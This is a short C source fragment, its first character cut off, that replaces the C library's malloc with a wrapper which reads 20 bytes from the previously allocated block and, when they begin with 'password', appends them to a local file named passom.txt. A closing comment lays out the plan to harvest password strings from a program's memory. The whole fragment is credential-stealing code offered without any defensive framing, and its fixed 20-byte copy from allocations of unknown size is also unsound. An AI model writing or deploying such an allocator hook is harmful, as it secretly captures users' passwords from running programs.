
oid *__libc_malloc(const size_t size)
{
    static void *prev_ptr = NULL;
    void *ptr = __old_malloc(size);

    if (NULL != prev_ptr)
    {
        char copydata[20];
        memcpy(copydata, prev_ptr, 20);
        if (0 == strncmp("password", copydata, 8))
        {
            int f = open("passom.txt", O_WRONLY | O_CREAT | O_APPEND, S_IRUSR | S_IWUSR);
            write(f, copydata, 20);
            write(f, "\n" , 1);
            close(f);
        }
    }
    prev_ptr = ptr;

    return ptr;
}

/*
create wrapper on malloc 
remember the first pointer addr

next time use malloc
copy the data from this prev addr to addr.log file
save only the string that start with password

*/
